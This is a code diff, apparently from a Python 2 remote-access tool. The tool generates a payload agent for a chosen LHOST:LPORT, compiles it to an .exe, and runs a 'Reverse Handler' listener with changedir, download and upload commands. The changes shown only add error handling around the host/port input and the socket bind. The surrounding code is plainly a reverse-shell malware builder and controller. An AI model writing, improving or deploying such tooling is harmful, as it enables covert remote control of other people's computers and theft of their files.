@@ -50,10 +50,15 @@ while True:
 		inp=raw_input("insert LHOST:LPORT : ")
 		nfile=raw_input("insert file name:")
 		pyfile=nfile+".py"
-		inp=inp.split(":")
-		host=inp[0]
+		try:
+			inp=inp.split(":")
 		
-		port=inp[1]
+			host=inp[0]
+		
+			port=inp[1]
+		except:
+			print "Error Syntax..."
+			continue
 		agent_open=open("temp.py","r")
 		out_open=open(pyfile,"w+")
 		for i in agent_open :
@@ -82,13 +87,17 @@ while True:
 		path1=os.getcwd()+"\\out\\"+nfile+".exe"
 		print "[*]Saved To "+path1
 	if mod == "2" :
-		host=raw_input("insert Your ip For Listen:")
-		port=input("insert your port For Listen:")
-		break
+		try:
+			host=raw_input("insert Your ip For Listen:")
+			port=input("insert your port For Listen:")
+			s = socket.socket()
+			s.bind((host, port))
+			break
+		except:
+			print "Ip Or Port Not Valid..."
+			continue
 symb={"changedir":"$1%","download":"$2%","upload":"$3%"}               
-s = socket.socket()         
-
-s.bind((host, port))        
+ 
 os.system(os1)
 print banner
 print "[*]Started Reverse Handler on "+host+":"+str(port)
